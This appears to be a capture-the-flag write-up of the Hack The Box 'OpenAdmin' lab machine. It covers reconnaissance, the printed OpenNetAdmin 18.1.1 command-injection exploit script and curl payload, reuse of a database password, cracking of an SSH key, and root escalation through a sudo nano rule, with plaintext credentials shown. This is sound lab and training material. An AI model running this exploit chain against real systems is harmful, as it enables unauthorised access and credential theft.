[TOC]



# OpenAdmin

IP : 10.10.10.171

OS: Linux

# Enumeration

## nmap

```bash
nmap -sV -sC -oA nmap 10.10.10.171
```

### Output

```bash
root@beanbag:~/htb/boxes/openadmin$ less nmap.nmap
# Nmap 7.80 scan initiated Mon Jan 20 22:19:39 2020 as: nmap -sV -sC -oA nmap 10.10.10.171
Nmap scan report for 10.10.10.171
Host is up (0.20s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan 20 22:20:01 2020 -- 1 IP address (1 host up) scanned in 22.25 seconds
```

### Interesting information

```bash
|_http-title: Apache2 Ubuntu Default Page: It works
```

Default Apache2 Ubuntu page. Likely means default configuration on the HTTP server.

## Nikto

```bash
nikto -h 10.10.10.171/index.html
```

### Output

Nothing interesting

```bash
- Nikto v2.1.6
---------------------------------------------------------------------------
+ ERROR: Invalid IP:

root@beanbag:~$ nikto -h http://10.10.10.171/index.html
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.171
+ Target Hostname:    10.10.10.171
+ Target Port:        80
+ Start Time:         2020-02-15 01:06:33 (GMT-8)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD
```





## Gobuster

```bash
gobuster dir -u 10.10.10.171 -w /usr/share/wordlists/dirb/big.txt -x html -t 30 | tee gobuster.out
```

### Output

```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.171
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html
[+] Timeout:        10s
===============================================================
2020/01/20 22:28:37 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.htpasswd.html (Status: 403)
/.htaccess (Status: 403)
/.htaccess.html (Status: 403)
/artwork (Status: 301)
/index.html (Status: 200)
/music (Status: 301)
/server-status (Status: 403)
/sierra (Status: 301)
===============================================================
2020/01/20 22:30:52 Finished
===============================================================
```

### Interesting Information

#### /artwork

- Template made by ColorLib 2020
- Nothing of interest

#### /music

Click the hamburger icon, pressed login

Redirected to /ona



## OpenNetAdmin (10.10.10.171/ona)

OpenNetAdmin is an IPAM (IP Address Management) tool to track network attributes such as DNS names, IP addresses, subnets, MAC addresses, etc.

References:

- http://opennetadmin.com/about.html
- http://opennetadmin.com/features.html

### Version

v18.1.1

### Login

Top right, click on `[change]`

Attempt: admin/admin

* **Success**!

### memetExploitDB : Remote Code Execution

```bash
root@beanbag:~/htb/boxes/openadmin$ searchsploit OpenNetAdmin
---------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                              |  Path
                                                                            | (/usr/share/exploitdb/)
---------------------------------------------------------------------------- ----------------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution                               | exploits/php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                | exploits/php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                                 | exploits/php/webapps/47691.sh
---------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

https://www.exploit-db.com/exploits/47691



```bash
root@beanbag:~/htb/boxes/openadmin$ searchsploit -x 47691
# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

# Exploit Title: OpenNetAdmin v18.1.1 RCE
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```



Let's try the curl command here...

```bash
root@beanbag:~/htb/boxes/openadmin$ CMD="id"
root@beanbag:~/htb/boxes/openadmin$ $CMD
uid=0(root) gid=0(root) groups=0(root)
root@beanbag:~/htb/boxes/openadmin$ OPENADMIN="http://10.10.10.171/ona/"

root@beanbag:~/htb/boxes/openadmin$ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${CMD};echo \"END\"&xajaxargs[]=ping" "${OPENADMIN}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```



Let's use the script to get a wonky shell

```bash
root@beanbag:~/htb/boxes/openadmin$ searchsploit -m 47691
  Exploit: OpenNetAdmin 18.1.1 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47691
     Path: /usr/share/exploitdb/exploits/php/webapps/47691.sh
File Type: ASCII text, with CRLF line terminators

Copied to: /root/htb/boxes/openadmin/47691.sh
root@beanbag:~/htb/boxes/openadmin$ chmod u+x 47691.sh
root@beanbag:~/htb/boxes/openadmin$ l 47691.sh
-rwxr-xr-x 1 root root 287 Feb 15 02:24 47691.sh
root@beanbag:~/htb/boxes/openadmin$ ./47691.sh "http://10.10.10.171/ona/"
47691.sh: line 8: $'\r': command not found
47691.sh: line 16: $'\r': command not found
47691.sh: line 18: $'\r': command not found
47691.sh: line 23: syntax error near unexpected token `done'
47691.sh: line 23: `done'
```

Seems to have Windows line endings leftover, let's use `sed` (or `dos2unix`) to remove them...

https://stackoverflow.com/questions/11680815/removing-windows-newlines-on-linux-sed-vs-awk

```bash
root@beanbag:~/htb/boxes/openadmin$ sed -i -e 's/\r$//' 47691.sh
root@beanbag:~/htb/boxes/openadmin$ ./47691.sh "http://10.10.10.171/ona/""
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ pwd
/opt/ona/www
```


## Enumeration

Where are we, what's going on, anything unusual popping out? When you have access to user `www-data`, it's best to start peeking around for config files and plaintext usernames or passwords.


Config looks interesting

```bash
$ ls -al
total 72
drwxrwxr-x 10 www-data www-data 4096 Nov 22 17:17 .
drwxr-x---  7 www-data www-data 4096 Nov 21 18:23 ..
-rw-rw-r--  1 www-data www-data 1970 Jan  3  2018 .htaccess.example
drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 config
-rw-rw-r--  1 www-data www-data 1949 Jan  3  2018 config_dnld.php
-rw-rw-r--  1 www-data www-data 4160 Jan  3  2018 dcm.php
drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 images
drwxrwxr-x  9 www-data www-data 4096 Jan  3  2018 include
-rw-rw-r--  1 www-data www-data 1999 Jan  3  2018 index.php
drwxrwxr-x  5 www-data www-data 4096 Jan  3  2018 local
-rw-rw-r--  1 www-data www-data 4526 Jan  3  2018 login.php
-rw-rw-r--  1 www-data www-data 1106 Jan  3  2018 logout.php
drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 modules
drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 plugins
drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 winc
drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 workspace_plugins
```
Nothing interesting in the `config` directory, unfortunately.


Is there anything readable  in /home?
```bash
$ ls -al /home
total 16
drwxr-xr-x  4 root   root   4096 Nov 22 18:00 .
drwxr-xr-x 24 root   root   4096 Nov 21 13:41 ..
drwxr-x---  5 jimmy  jimmy  4096 Nov 22 23:15 jimmy
drwxr-x---  6 joanna joanna 4096 Feb 28 06:24 joanna
```
No, we can't read peek into any of the directories. Root/user access only, as it should be. 


```bash
$ ls -al -R local
local:
total 20
drwxrwxr-x  5 www-data www-data 4096 Jan  3  2018 .
drwxrwxr-x 10 www-data www-data 4096 Nov 22 17:17 ..
drwxrwxr-x  2 www-data www-data 4096 Nov 21 16:51 config
drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 nmap_scans
drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 plugins

local/config:
total 16
drwxrwxr-x 2 www-data www-data 4096 Nov 21 16:51 .
drwxrwxr-x 5 www-data www-data 4096 Jan  3  2018 ..
-rw-r--r-- 1 www-data www-data  426 Nov 21 16:51 database_settings.inc.php
-rw-rw-r-- 1 www-data www-data 1201 Jan  3  2018 motd.txt.example
-rw-r--r-- 1 www-data www-data    0 Nov 21 16:28 run_installer

local/nmap_scans:
total 12
drwxrwxr-x 3 www-data www-data 4096 Jan  3  2018 .
drwxrwxr-x 5 www-data www-data 4096 Jan  3  2018 ..
drwxrwxr-x 2 www-data www-data 4096 Jan  3  2018 subnets

local/nmap_scans/subnets:
total 36
drwxrwxr-x 2 www-data www-data  4096 Jan  3  2018 .
drwxrwxr-x 3 www-data www-data  4096 Jan  3  2018 ..
-rw-rw-r-- 1 www-data www-data 26149 Jan  3  2018 nmap.xsl

local/plugins:
total 12
drwxrwxr-x 2 www-data www-data 4096 Jan  3  2018 .
drwxrwxr-x 5 www-data www-data 4096 Jan  3  2018 ..
-rw-rw-r-- 1 www-data www-data  230 Jan  3  2018 README
$
```

### mysqli login

```php
$ cat local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' =>
  array (
    'databases' =>
    array (
      0 =>
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```



## User login (jimmy)

Try the password against users found in /home


```bash
ssh jimmy@10.10.10.171
n1nj4W4rri0R!

jimmy@openadmin:~$ id
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
```

### Enumeration

Nothing in the home directory which means we have to get into the other user's account!
```bash
jimmy@openadmin:~$ ls -al
total 32
drwxr-x--- 5 jimmy jimmy 4096 Nov 22 23:15 .
drwxr-xr-x 4 root  root  4096 Nov 22 18:00 ..
lrwxrwxrwx 1 jimmy jimmy    9 Nov 21 14:07 .bash_history -> /dev/null
-rw-r--r-- 1 jimmy jimmy  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 jimmy jimmy 3771 Apr  4  2018 .bashrc
drwx------ 2 jimmy jimmy 4096 Nov 21 13:52 .cache
drwx------ 3 jimmy jimmy 4096 Nov 21 13:52 .gnupg
drwxrwxr-x 3 jimmy jimmy 4096 Nov 22 23:15 .local
-rw-r--r-- 1 jimmy jimmy  807 Apr  4  2018 .profile
```

No media, nothing mounted
```bash
jimmy@openadmin:~$ cd /
jimmy@openadmin:/$ ls -al media
total 8
drwxr-xr-x  2 root root 4096 Aug  5  2019 .
drwxr-xr-x 24 root root 4096 Nov 21 13:41 ..
jimmy@openadmin:/$ ls -al mnt
total 8
drwxr-xr-x  2 root root 4096 Aug  5  2019 .
drwxr-xr-x 24 root root 4096 Nov 21 13:41 ..
```

Any local servers running?
```bash
jimmy@openadmin:~$ netstat -l
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN
tcp        0      0 localhost:52846         0.0.0.0:*               LISTEN
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN
tcp6       0      0 [::]:http               [::]:*                  LISTEN
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN
udp        0      0 localhost:domain        0.0.0.0:*
```

### Linenum

On Kali box
```bash
root@beanbag:~/htb/scripts$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
root@beanbag:~/htb/scripts$ python -m http.server 8088
Serving HTTP on 0.0.0.0 port 8088 (http://0.0.0.0:8088/) ...
10.10.10.171 - - [27/Feb/2020 23:03:22] code 404, message File not found
10.10.10.171 - - [27/Feb/2020 23:03:22] "GET /linEnum.sh HTTP/1.1" 404 -
10.10.10.171 - - [27/Feb/2020 23:03:37] "GET /LinEnum.sh HTTP/1.1" 200 -
^C^C
Keyboard interrupt received, exiting.
```

On OpenAdmin
```bash
jimmy@openadmin:/tmp/nosas$ wget 10.10.15.13:8088/LinEnum.sh
--2020-02-28 07:05:03--  http://10.10.15.13:8088/LinEnum.sh
Connecting to 10.10.15.13:8088... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: ‘LinEnum.sh’

LinEnum.sh                                                  100%[========================================================================================================================================>]  45.54K  --.-KB/s    in 0.1s

2020-02-28 07:05:03 (346 KB/s) - ‘LinEnum.sh’ saved [46631/46631]
jimmy@openadmin:/tmp/nosas$ ls -al
total 56
drwxrwxr-x  2 jimmy jimmy  4096 Feb 28 07:05 .
drwxrwxrwt 12 root  root   4096 Feb 28 07:04 ..
-rw-rw-r--  1 jimmy jimmy 46631 Feb 28 07:01 LinEnum.sh
jimmy@openadmin:/tmp/nosas$ chmod +x LinEnum.sh
jimmy@openadmin:/tmp/nosas$ ./LinEnum.sh
```

## mysql

```bash
mysql --user= --password db_name
mysql> show columns from users;
+----------+------------------+------+-----+-------------------+-----------------------------+
| Field    | Type             | Null | Key | Default           | Extra                       |
+----------+------------------+------+-----+-------------------+-----------------------------+
| id       | int(10) unsigned | NO   | PRI | NULL              | auto_increment              |
| username | varchar(32)      | NO   | UNI | NULL              |                             |
| password | varchar(64)      | NO   |     | NULL              |                             |
| level    | int(4)           | NO   |     | 0                 |                             |
| ctime    | timestamp        | NO   |     | CURRENT_TIMESTAMP | on update CURRENT_TIMESTAMP |
| atime    | datetime         | YES  |     | NULL              |                             |
+----------+------------------+------+-----+-------------------+-----------------------------+
6 rows in set (0.00 sec)

mysql> SELECT * from users WHERE username = 'joanna';
Empty set (0.00 sec)

mysql> SELECT * from users;
+----+----------+----------------------------------+-------+---------------------+---------------------+
| id | username | password                         | level | ctime               | atime               |
+----+----------+----------------------------------+-------+---------------------+---------------------+
|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |     0 | 2020-02-28 07:32:30 | 2020-02-28 07:32:30 |
|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |     0 | 2007-10-30 03:00:17 | 2007-12-02 22:10:26 |
+----+----------+----------------------------------+-------+---------------------+---------------------+
2 rows in set (0.00 sec)
```

## CURL the mysterious service

```bash
n1nj4W4rri0R!

curl --user jimmy:n1nj4W4rri0R! localhost:52846
curl -X POST -F 'username=jimmy' -F 'password=n1nj4W4rri0R!' -F 'login=login' http://localhost:52846/index.php
wget http://localhost:52846/login.php?username=jimmy&password=n1nj4W4rri0R!
curl -X POST -F 'username=jimmy' -F 'password=n1nj4W4rri0R!' -F 'login=login' http://localhost:52846/


WRONG



jimmy@openadmin:~$ curl localhost:52846/main.php                                                                                                                                                                                    [57/7712]
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>

```



## Privilege Escalation

### Turn the RSA private key into a hash that John the Ripper can crack

```bash
curl https://raw.githubusercontent.com/koboi137/john/bionic/ssh2john.py --output ssh2john.py
ssh2john.py id_rsa > id_rsa.hash
apt-get install john -y

```

```bash
root@beanbag:~/htb/boxes/openadmin$ john id_rsa.hash -wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (id_rsa)
1g 0:00:00:07 DONE (2020-03-05 23:07) 0.1253g/s 1797Kp/s 1797Kc/s 1797KC/sa6_123..*7¡Vamos!
Session completed
root@beanbag:~/htb/boxes/openadmin$




root@beanbag:~/htb/boxes/openadmin$ ssh -i id_rsa
usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface]
           [-b bind_address] [-c cipher_spec] [-D [bind_address:]port]
           [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11]
           [-i identity_file] [-J [user@]host[:port]] [-L address]
           [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]
           [-Q query_option] [-R address] [-S ctl_path] [-W host:port]
           [-w local_tun[:remote_tun]] destination [command]
root@beanbag:~/htb/boxes/openadmin$ ssh -i id_rsa joanna@10.10.10.171
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
joanna@10.10.10.171's password:
Permission denied, please try again.

root@beanbag:~/htb/boxes/openadmin$
root@beanbag:~/htb/boxes/openadmin$ ll
total 116
-rwxr-xr-x 1 root root   757 Feb 15 02:33 47691.sh
-rw-r--r-- 1 root root 79696 Feb 27 23:06 enum.out-28-02-20
-rw-r--r-- 1 root root     0 Feb 15 01:02 gobuster
-rw-r--r-- 1 root root  1011 Jan 20 22:30 gobuster.out
-rw-r--r-- 1 root root  1767 Mar  5 21:51 id_rsa
-rw-r--r-- 1 root root  2458 Mar  5 21:54 id_rsa.hash
-rw-r--r-- 1 root root   406 Jan 20 22:20 nmap.gnmap
-rw-r--r-- 1 root root   895 Jan 20 22:20 nmap.nmap
-rw-r--r-- 1 root root  7108 Jan 20 22:20 nmap.xml
-rw-r--r-- 1 root root   244 Feb 15 03:04 ona.out
root@beanbag:~/htb/boxes/openadmin$ chmod id_rsa 600

root@beanbag:~/htb/boxes/openadmin$ chmod id_rsa 600
chmod: invalid mode: ‘id_rsa’
Try 'chmod --help' for more information.
root@beanbag:~/htb/boxes/openadmin$ chmod id_rsa 600
chmod: invalid mode: ‘id_rsa’
Try 'chmod --help' for more information.
root@beanbag:~/htb/boxes/openadmin$ chmod id_600 id_rsa
chmod: invalid mode: ‘id_600’
Try 'chmod --help' for more information.
root@beanbag:~/htb/boxes/openadmin$ chmod 600 id_rsa
root@beanbag:~/htb/boxes/openadmin$ ls -al id_rsa
-rw------- 1 root root 1767 Mar  5 21:51 id_rsa
root@beanbag:~/htb/boxes/openadmin$ ssh -i id_rsa joanna@10.10.10.171
Enter passphrase for key 'id_rsa':
Enter passphrase for key 'id_rsa':
Enter passphrase for key 'id_rsa':
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Mar  6 07:16:00 UTC 2020

  System load:  0.04              Processes:             122
  Usage of /:   50.5% of 7.81GB   Users logged in:       1
  Memory usage: 31%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Mar  6 06:35:30 2020 from 10.10.14.10
joanna@openadmin:~$ ls -al /home/joanna
total 40
drwxr-x--- 6 joanna joanna 4096 Nov 28 09:37 .
drwxr-xr-x 4 root   root   4096 Nov 22 18:00 ..
lrwxrwxrwx 1 joanna joanna    9 Nov 22 18:02 .bash_history -> /dev/null
-rw-r--r-- 1 joanna joanna  220 Nov 22 18:00 .bash_logout
-rw-r--r-- 1 joanna joanna 3771 Nov 22 18:00 .bashrc
drwx------ 2 joanna joanna 4096 Nov 22 22:42 .cache
drwx------ 3 joanna joanna 4096 Nov 22 22:42 .gnupg
drwxrwxr-x 3 joanna joanna 4096 Nov 22 18:53 .local
-rw-r--r-- 1 joanna joanna  807 Nov 22 18:00 .profile
drwx------ 2 joanna joanna 4096 Nov 23 17:31 .ssh
-rw-rw-r-- 1 joanna joanna   33 Nov 28 09:37 user.txt
joanna@openadmin:~$ cat user.txt
c9b2cf07d40807e62af62660f0c81b5f
joanna@openadmin:~$

joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
joanna@openadmin:~$ sudo /bin/nano /opt/priv
^R^X
Command to execute: cat /root/root.txt
(See nano image)
2f907ed450b361b2c2bf4e8795d5b561


```





References:

https://gtfobins.github.io/gtfobins/nano/

https://www.hackingarticles.in/beginners-guide-for-john-the-ripper-part-2/